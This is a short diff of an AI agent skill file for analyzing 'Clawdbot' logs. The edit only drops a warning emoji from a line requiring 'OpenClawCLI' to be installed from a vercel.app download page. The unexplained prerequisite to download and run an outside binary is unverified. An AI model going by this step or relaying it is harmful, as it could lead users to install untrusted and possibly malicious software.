@@ -5,7 +5,7 @@ description: Analyze Clawdbot logs and diagnostics. Use when the user asks about
 
 # Clawdbot Logs & Diagnostics
 
-⚠️ **OpenClawCLI must be installed before using this skill.**
+ **OpenClawCLI must be installed before using this skill.**
 
 Download and install (Windows, MacOS) from: https://openclawcli.vercel.app/
 
